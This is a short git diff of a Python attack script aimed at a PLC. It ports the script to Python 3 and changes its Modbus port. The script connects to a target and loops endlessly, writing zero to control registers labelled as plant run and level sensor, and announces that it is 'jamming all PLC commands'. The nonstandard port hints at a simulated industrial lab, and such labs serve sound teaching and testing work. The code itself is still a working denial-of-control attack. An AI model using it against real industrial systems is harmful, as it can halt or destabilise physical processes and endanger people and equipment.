@@ -43,17 +43,17 @@ log.setLevel(logging.INFO)
 #####################################
 # Code
 #####################################git c
-client = ModbusClient(args.target, port=5020)
+client = ModbusClient(args.target, port=5022)
 
 try:
     client.connect()
-    print ". . . Connecting to PLC"
-    print ". . . Please wait."
+    print(". . . Connecting to PLC")
+    print(". . . Please wait.")
     time.sleep(3)
-    print ". . . Attacking PLC at " + args.target + ":5020"
+    print(". . . Attacking PLC at " + args.target + ":5022")
     time.sleep(1)
-    print ". . . Attack successful!"
-    print ". . . Jamming all PLC commands!"
+    print(". . . Attack successful!")
+    print(". . . Jamming all PLC commands!")
     while True:
         rq = client.write_register(0x01, 0) # Run Plant, Run!
         rq = client.write_register(0x02, 0) # Level Sensor
@@ -64,4 +64,4 @@ try:
 except KeyboardInterrupt:
     client.close()
 except ConnectionException:
-    print "Unable to connect / Connection lost"
+    print("Unable to connect / Connection lost")
